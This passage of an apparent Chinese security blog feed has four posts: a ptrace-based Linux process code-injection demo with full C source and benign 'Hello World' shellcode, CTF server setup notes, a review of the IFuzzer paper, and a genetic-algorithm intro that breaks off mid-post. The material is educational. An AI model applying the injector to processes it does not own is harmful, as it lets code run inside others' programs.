    
    
      <category term="感悟" scheme="http://o0xmuhe.me/tags/%E6%84%9F%E6%82%9F/"/>
    
  </entry>
  
  <entry>
    <title>linux code inject</title>
    <link href="http://o0xmuhe.me/2018/06/16/linux-code-inject/"/>
    <id>http://o0xmuhe.me/2018/06/16/linux-code-inject/</id>
    <published>2018-06-16T07:21:25.000Z</published>
    <updated>2018-06-16T07:28:14.218Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 : 基础"></a>0x00 : 基础</h4><p>产生一个新的进程的方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sys_clone – creates a copy of the running process with or without shared resources (memory, file descriptors, etc.);</span><br><span class="line">sys_execve – replaces the running process with a new one (has several variations in the C library);</span><br><span class="line">fork - creates a copy of the running process but without any shared resources (Actually, both sys_fork and sys_clone come down to do_fork() function in the kernel).</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h4 id="0x01-实例"><a href="#0x01-实例" class="headerlink" title="0x01 : 实例"></a>0x01 : 实例</h4><p>目标程序代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"counter:%d\n"</span>,i);</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注入程序代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> long_size = <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getdata</span><span class="params">(<span class="keyword">pid_t</span> child, <span class="keyword">long</span> addr,<span class="keyword">char</span>* str,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> * laddr;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">union</span> u&#123;</span><br><span class="line">        <span class="keyword">long</span> val;</span><br><span class="line">        <span class="keyword">char</span> chars[long_size];</span><br><span class="line">    &#125;data;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len/long_size;</span><br><span class="line">    laddr = str;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">        data.val = ptrace(PTRACE_PEEKDATA,child,addr+i*<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(laddr,data.chars,long_size);</span><br><span class="line">        ++i;</span><br><span class="line">        laddr+=long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % long_size;</span><br><span class="line">    <span class="keyword">if</span>(j!=<span class="number">0</span>)&#123;</span><br><span class="line">        data.val=ptrace(PTRACE_PEEKDATA,child,addr+i*<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(laddr,data.chars,j);</span><br><span class="line">    &#125;</span><br><span class="line">    str[len]=<span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putdata</span><span class="params">(<span class="keyword">pid_t</span> child, <span class="keyword">long</span> addr,<span class="keyword">char</span>* str, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">char</span> *laddr;</span><br><span class="line">    <span class="keyword">union</span> u&#123;</span><br><span class="line">        <span class="keyword">long</span> val;</span><br><span class="line">        <span class="keyword">char</span> chars[long_size];</span><br><span class="line">    &#125;data;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len/long_size;</span><br><span class="line">    laddr = str;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars,laddr,long_size);</span><br><span class="line">        ptrace(PTRACE_POKEDATA,child,addr+i*<span class="number">4</span>,data.val);</span><br><span class="line">        ++i;</span><br><span class="line">        laddr+=long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % long_size;</span><br><span class="line">    <span class="keyword">if</span>(j!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars,laddr,j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA,child,addr+i*<span class="number">4</span>,data.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>*argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> traced_process;</span><br><span class="line">    <span class="keyword">struct</span> user_regs_struct regs,newregs;</span><br><span class="line">    <span class="keyword">long</span> ins;</span><br><span class="line">    <span class="keyword">int</span> k,h;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="number">41</span>;</span><br><span class="line">    <span class="keyword">char</span> shellcode[] = <span class="string">"\xeb\x15\x5e\xb8\x04\x00\x00\x00"</span></span><br><span class="line">                        <span class="string">"\xbb\x02\x00\x00\x00\x89\xf1\xba"</span></span><br><span class="line">                        <span class="string">"\x0c\x00\x00\x00\xcd\x80\xcc\xe8"</span></span><br><span class="line">                        <span class="string">"\xe6\xff\xff\xff\x48\x65\x6c\x6c"</span></span><br><span class="line">                        <span class="string">"\x6f\x20\x57\x6f\x72\x6c\x64\x0a\x00"</span>;</span><br><span class="line">    <span class="keyword">char</span> backup[len];</span><br><span class="line">    <span class="keyword">long</span> addr;</span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"command input error\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    traced_process = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//attach to process </span></span><br><span class="line">    ptrace(PTRACE_ATTACH,traced_process,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//get curren regs</span></span><br><span class="line">    ptrace(PTRACE_GETREGS,traced_process,<span class="literal">NULL</span>,&amp;regs);</span><br><span class="line">    <span class="comment">//print eip</span></span><br><span class="line">    ins = ptrace(PTRACE_PEEKTEXT,traced_process,regs.eip,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"EIP:%lx instruction executed: %lx\n"</span>,regs.eip,ins);</span><br><span class="line">    getdata(traced_process,regs.eip,backup,len);</span><br><span class="line">    <span class="comment">//print code</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"backup is :\n"</span>);</span><br><span class="line">    <span class="keyword">for</span>(k = <span class="number">0</span>;k&lt;<span class="number">41</span>;k++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%x "</span>,backup[k]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    putdata(traced_process,regs.eip,shellcode,len);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"shellcode is :\n"</span>);</span><br><span class="line">    <span class="keyword">for</span>(k = <span class="number">0</span>;k&lt;<span class="number">41</span>;k++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%x "</span>,shellcode[k]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="comment">//re-set args</span></span><br><span class="line">    ptrace(PTRACE_SETREGS,traced_process,<span class="literal">NULL</span>,&amp;regs);</span><br><span class="line">    <span class="comment">//back</span></span><br><span class="line">    ptrace(PTRACE_CONT,traced_process,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//wait for change</span></span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Press the enter key to continue\n"</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="comment">//recover the code</span></span><br><span class="line">    putdata(traced_process,regs.eip,backup,len);</span><br><span class="line">    ptrace(PTRACE_SETREGS,traced_process,<span class="literal">NULL</span>,&amp;regs);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"excute origion code\n"</span>);</span><br><span class="line">    ptrace(PTRACE_DETACH,traced_process,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="0x02-效果"><a href="#0x02-效果" class="headerlink" title="0x02 : 效果"></a>0x02 : 效果</h4><p><img src="http://blogimg-10065924.cossh.myqcloud.com/linux_code_inject/1.jpg" alt="res"></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-基础&quot;&gt;&lt;a href=&quot;#0x00-基础&quot; class=&quot;headerlink&quot; title=&quot;0x00 : 基础&quot;&gt;&lt;/a&gt;0x00 : 基础&lt;/h4&gt;&lt;p&gt;产生一个新的进程的方式&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sys_clone – creates a copy of the running process with or without shared resources (memory, file descriptors, etc.);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sys_execve – replaces the running process with a new one (has several variations in the C library);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;fork - creates a copy of the running process but without any shared resources (Actually, both sys_fork and sys_clone come down to do_fork() function in the kernel).&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="linux" scheme="http://o0xmuhe.me/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>比赛运维杂记</title>
    <link href="http://o0xmuhe.me/2018/06/16/%E6%AF%94%E8%B5%9B%E8%BF%90%E7%BB%B4%E6%9D%82%E8%AE%B0/"/>
    <id>http://o0xmuhe.me/2018/06/16/比赛运维杂记/</id>
    <published>2018-06-16T07:12:09.000Z</published>
    <updated>2018-06-16T07:19:41.725Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 : 前言"></a>0x00 : 前言</h2><p>又是一届校赛了。学弟在配环境的时候一直问我相关的问题，然而我以前的笔记找不到了，今天偶然找到了，索性直接发出来吧。这是第一次参加校赛时候配环境的记录了，两年前吧，比较naive，有很多地方不全面。</p>
<a id="more"></a>
<h2 id="0x01-基本信息"><a href="#0x01-基本信息" class="headerlink" title="0x01 基本信息"></a>0x01 基本信息</h2><p>查看基本信息<code>uname -a</code> 或者 <code>cat /proc/version</code><br>查看<code>centOS</code> 系统版本 <code>rpm -q centos-release</code></p>
<h2 id="0x02-更新-centOS为例"><a href="#0x02-更新-centOS为例" class="headerlink" title="0x02 更新(centOS为例)"></a>0x02 更新(centOS为例)</h2><h3 id="1-备份"><a href="#1-备份" class="headerlink" title="1.备份"></a>1.备份</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><br></pre></td></tr></table></figure>
<h3 id="2-下载yum配置文件"><a href="#2-下载yum配置文件" class="headerlink" title="2.下载yum配置文件"></a>2.下载yum配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/yum.repos.d/ </span><br><span class="line">wget http://mirrors.163.com/.help/CentOS6-Base-163.repo</span><br></pre></td></tr></table></figure>
<h3 id="3-生成缓存"><a href="#3-生成缓存" class="headerlink" title="3.生成缓存"></a>3.生成缓存</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum makecache</span><br></pre></td></tr></table></figure>
<h3 id="4-更新"><a href="#4-更新" class="headerlink" title="4.更新"></a>4.更新</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y update</span><br></pre></td></tr></table></figure>
<p>安装32位库 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install xulrunner.i686</span><br></pre></td></tr></table></figure>
<h2 id="0x03-守护进程的配置"><a href="#0x03-守护进程的配置" class="headerlink" title="0x03 守护进程的配置"></a>0x03 守护进程的配置</h2><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install xinetd</span><br></pre></td></tr></table></figure>
<h3 id="2-配置"><a href="#2-配置" class="headerlink" title="2.配置"></a>2.配置</h3><p><code>/etc/services</code> 下先添加自己的服务端口信息<br><code>/etc/xinetd.d/</code> 下添加自己的服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">service pwn_test</span><br><span class="line">&#123;</span><br><span class="line">    disable = no //打开</span><br><span class="line">    port = 50001 </span><br><span class="line">    socket_type = stream</span><br><span class="line">    server = /home/pwn100/pwn100</span><br><span class="line">    wait = no </span><br><span class="line">    user = pwn_user</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>之后重启服务就好了<code>service xinetd restart</code></p>
<h2 id="0x04-socat"><a href="#0x04-socat" class="headerlink" title="0x04 socat"></a>0x04 socat</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget –no-cache http://www.convirture.com/repos/definitions/rhel/6.x/convirt.repo -O /etc/yum.repos.d/convirt.repo </span><br><span class="line">yum makecache</span><br><span class="line">yum install socat</span><br></pre></td></tr></table></figure>
<h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>如果要socat去配置pwn服务，写一个bash脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup socat TCP4-LISTEN:10001,fork EXEC:./pwn100 &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
<p>给x权限后运行即可</p>
<h2 id="0x05-其他杂项配置"><a href="#0x05-其他杂项配置" class="headerlink" title="0x05 其他杂项配置"></a>0x05 其他杂项配置</h2><p>安装32bit库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install libstdc++-devel.i686 glibc.i686 libgcc.i686 libstdc++.i686 glibc-devel.i686</span><br></pre></td></tr></table></figure>
<h2 id="0x06-抓流量"><a href="#0x06-抓流量" class="headerlink" title="0x06 抓流量"></a>0x06 抓流量</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh </span></span><br><span class="line">file_path=<span class="string">"/home/sycfiles/pwn_log/"</span></span><br><span class="line">file_name=`date <span class="string">"+%H%M"</span>`</span><br><span class="line">path=<span class="variable">$file_path</span><span class="variable">$file_name</span></span><br><span class="line">killall  tcpdump233</span><br><span class="line">nohup tcpdump233 -i eth1 tcp port 50001 -w <span class="variable">$path</span>  &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#0 */1 * * * 用户 脚本路径</span></span><br><span class="line">0 */1 * * *  root   /root/pwn_log.sh</span><br></pre></td></tr></table></figure>
<h2 id="0x07-其他"><a href="#0x07-其他" class="headerlink" title="0x07 其他"></a>0x07 其他</h2><p>主要是注意目录、文件权限以及fork炸弹之类的搅屎棍行为的限制，最好还是docker吧，比较方便。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 : 前言&quot;&gt;&lt;/a&gt;0x00 : 前言&lt;/h2&gt;&lt;p&gt;又是一届校赛了。学弟在配环境的时候一直问我相关的问题，然而我以前的笔记找不到了，今天偶然找到了，索性直接发出来吧。这是第一次参加校赛时候配环境的记录了，两年前吧，比较naive，有很多地方不全面。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://o0xmuhe.me/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>论文阅读&lt;IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming&gt;</title>
    <link href="http://o0xmuhe.me/2018/06/09/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-IFuzzer-An-Evolutionary-Interpreter-Fuzzer-using-Genetic-Programming/"/>
    <id>http://o0xmuhe.me/2018/06/09/论文阅读-IFuzzer-An-Evolutionary-Interpreter-Fuzzer-using-Genetic-Programming/</id>
    <published>2018-06-08T16:29:42.000Z</published>
    <updated>2018-06-09T03:45:27.553Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-关于"><a href="#0x00-关于" class="headerlink" title="0x00:关于"></a>0x00:关于</h4><p>最近在阅读一些漏洞挖掘相关技术的论文，正好读到这篇，做个记录。<br>这篇论文是<code>IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming</code>。<br>主要是介绍<a href="https://github.com/vspandan/IFuzzer" target="_blank" rel="noopener">IFuzzer</a>的一篇论文，主要是利用antlr4+遗传算法搞js fuzz。<br><a id="more"></a></p>
<h4 id="0x01-论文阅读"><a href="#0x01-论文阅读" class="headerlink" title="0x01:论文阅读"></a>0x01:论文阅读</h4><p>该论文主要是针对脚本引擎的fuzz，只是文中使用了js engine作为目标。</p>
<p>核心思想就是：收集大量的测试代码，使用antlr4编写好的语法解析器解析出<code>非终结符片段</code>，把输入解析成AST后，在AST上进行变异。</p>
<p>变异的方式主要是利用收集的“片段”去替换解析树中相同非终结符，由于采用了遗传算法，通过对每个个体的评估，筛选优秀的个体进行“杂交”产生新的个体进入下一轮fuzz，“杂交”的方法是交换两个个体中相同的非终结符节点，产生两棵新的输。</p>
<p>采用遗传算法必须面对膨胀控制的问题。这里论文作者对每个个体评估时，采用了如下的公式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fb(x) = score_structure + score_feedback</span><br><span class="line">ffinal(x) = fb(x) − c ∗ (l(x))</span><br></pre></td></tr></table></figure>
<p>即：</p>
<p>基础得分=结构得分+(解释器)回馈得分<br>最终得分=基础的分-膨胀控制</p>
<p>这样的话的确有效的控制了遗传算法在迭代中的膨胀问题。</p>
<p>论文中测试部分没仔细看，我只关注了核心的算法和一些问题的解决，剩下的工作就是去阅读IFuzzer代码去体会了。</p>
<h4 id="0x02-个人想法"><a href="#0x02-个人想法" class="headerlink" title="0x02:个人想法"></a>0x02:个人想法</h4><p>首先感觉这个东西没那么完善，或者说没放全。</p>
<p>变异的策略其实可以更多的，这种替换的方式感觉还是有局限性，其实就是类似于用一大堆积木，去组合，是从现有的东西生成一些组合性的东西；如果可以加入创造性的东西就好了，比如积木的形状、材质改变，然后去创造新的组合。</p>
<p>记得几个月前看过韩国一个大佬（BoB计划的导师）的slide，他做的类似的事情，但是不一样的是：他把收集的测试代码、poc解析后到AST然后到IR，直接在IR上操作，之后从IR再生成js代码，效果也不错，但是那个没放出源码所以也不好与IFuzzer比较。</p>
<p>从身边的大佬的说法来看，IFuzzer很有限，需要改进的地方很多- 。- 不过我个人认为，这样的思路值得借鉴，虽然很好想，但是难做啊。。去年就想这么搞了，然而一些基础知识跟不上，现如今可以试一试啦～</p>
<h4 id="0x03-引用"><a href="#0x03-引用" class="headerlink" title="0x03:引用"></a>0x03:引用</h4><p><a href="https://link.springer.com/chapter/10.1007/978-3-319-45744-4_29" target="_blank" rel="noopener">IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-关于&quot;&gt;&lt;a href=&quot;#0x00-关于&quot; class=&quot;headerlink&quot; title=&quot;0x00:关于&quot;&gt;&lt;/a&gt;0x00:关于&lt;/h4&gt;&lt;p&gt;最近在阅读一些漏洞挖掘相关技术的论文，正好读到这篇，做个记录。&lt;br&gt;这篇论文是&lt;code&gt;IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming&lt;/code&gt;。&lt;br&gt;主要是介绍&lt;a href=&quot;https://github.com/vspandan/IFuzzer&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;IFuzzer&lt;/a&gt;的一篇论文，主要是利用antlr4+遗传算法搞js fuzz。&lt;br&gt;
    
    </summary>
    
    
      <category term="fuzz" scheme="http://o0xmuhe.me/tags/fuzz/"/>
    
      <category term="study" scheme="http://o0xmuhe.me/tags/study/"/>
    
      <category term="paper" scheme="http://o0xmuhe.me/tags/paper/"/>
    
  </entry>
  
  <entry>
    <title>遗传算法初窥</title>
    <link href="http://o0xmuhe.me/2018/06/03/%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95%E5%88%9D%E7%AA%A5/"/>
    <id>http://o0xmuhe.me/2018/06/03/遗传算法初窥/</id>
    <published>2018-06-02T17:13:32.000Z</published>
    <updated>2018-06-04T13:13:58.922Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>读Fuzzing相关的paper的时候遇到了关于遗传算法的问题，其实AFL晒样本也是用了遗传算法，个人的话一直没去探究，正好读paper遇到了，就搜了一下，找到了一篇好文 <a href="https://blog.sicara.com/getting-started-genetic-algorithms-python-tutorial-81ffa1dd72f9" target="_blank" rel="noopener">getting-started-genetic-algorithms-python-tutorial</a>，看完之后一下子明了，并且大呼过瘾 (好文章啊!)</p>
<a id="more"></a>
<h4 id="0x01-达尔文进化论"><a href="#0x01-达尔文进化论" class="headerlink" title="0x01 : 达尔文进化论"></a>0x01 : 达尔文进化论</h4><p><code>达尔文认为，生物之间存在着生存争斗，适应者生存下来，不适者则被淘汰，这就是自然的选择。生物正是通过遗传、变异和自然选择，从低级到高级，从简单到复杂，种类由少到多地进化着、发展着。</code></p>
<h4 id="0x02-遗传算法简述"><a href="#0x02-遗传算法简述" class="headerlink" title="0x02 : 遗传算法简述"></a>0x02 : 遗传算法简述</h4><p>这个算法的核心理念很简单：<code>如果一个种群想持续发展下去，就必须不断的提高自身，去适应环境，在使用过程中会个体会产生变异，适应环境的变异会保留下来，遗传给后代，这么一代一代的筛选下来，留下来的都是最适应环境的个体。</code></p>
<p>我们拿Fuzz举例，每一个样本进去所触发的路径、执行时间都有差异，那么如何去筛选出有效的样本，从而从这些样本再次迭代出新一代样本，从而让我们的Fuzz更加有效呢？</p>
<p>这时候我们需要一个评分规则（类比环境适应能力），评分越高，那么适应能力就越好，在这次样本变异中变异的部分（特性）会被保留下来，遗传给下一代。</p>
<p>参考AFL，它使用了路径等信息计算一个评分，评分高的样本保留（触发路径多），那么从这些样本中迭代，就容易产生更“优秀”的样本文件。</p>
<p>下图遗传算法的简单描述:</p>
<p><img src="http://blogimg-10065924.cossh.myqcloud.com/genetic_algorithm/GP.png" alt="GP"></p>
<h4 id="0x03-举个栗子"><a href="#0x03-举个栗子" class="headerlink" title="0x03 : 举个栗子"></a>0x03 : 举个栗子</h4><p>例子来自<a href="https://blog.sicara.com/getting-started-genetic-algorithms-python-tutorial-81ffa1dd72f9" target="_blank" rel="noopener">getting-started-genetic-algorithms-python-tutorial</a></p>
<h5 id="1-demo简述"><a href="#1-demo简述" class="headerlink" title="1. demo简述"></a>1. demo简述</h5><p>这里创建一个已知长度的密码破解程序 -。- （这不就是暴力破解吗，是的没错，但是思维方式要换一换啦）</p>
